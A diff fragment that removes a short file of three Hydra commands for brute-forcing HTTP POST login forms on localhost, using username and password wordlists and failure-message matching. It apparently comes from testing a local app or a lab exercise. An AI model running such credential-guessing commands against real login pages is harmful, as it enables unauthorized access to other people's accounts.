@@ -1,7 +1,0 @@
-hydra -V -l user.txt -P pass.txt 127.0.0.1 http-post-form '/:Username=^USER^&Password=^PASS^:Invalid credentials'
-
-
-
-sudo hydra -L user.txt -P pass.txt -u -f 127.0.0.1 -s 5000 http-post-form '/login:Username=^USER^&Password=^PASS^:Invalid credentials'   
-
-sudo hydra -L user.txt -P pass.txt -u -f 127.0.0.1 -s 5000 http-post-form '/login:username=^USER^&password=^PASS^:Something went wrong.'
